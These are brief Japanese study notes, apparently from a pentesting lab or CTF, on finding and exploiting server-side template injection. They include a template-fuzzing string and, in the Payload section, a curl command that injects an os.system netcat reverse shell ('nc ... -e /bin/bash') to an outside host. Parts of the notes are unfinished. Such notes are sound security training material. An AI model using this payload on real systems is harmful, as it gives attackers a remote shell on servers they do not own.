## ## SSTIの理解
 - SSTIは、SSTIを見つけようとしないと見過ごされやすい脆弱性である。

### ### SSTIの見つけ方
 - 特殊文字の列挙(テンプレートファジング)をするのが一般的。
```sh
${{<%[%'"}}%\
```
->注意:SSTIは2つの異なるこん

--- 
![[Pasted image 20250524180648.png]]
- 上記のような{}が出力されているときは、SSTIを疑ってよい

## ## Payload
```
curl -i http://192.168.237.117:50000/verify -X POST --data 'code=5*5'
curl -i http://192.168.243.117:50000/verify -X POST --data 'code=os.system("nc 192.168.45.154 18000 -e /bin/bash")'
```
※参考サイト
[https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys);

---
## ## Enumeration
### ### wordbruteforce
```sh
ffuf 
```

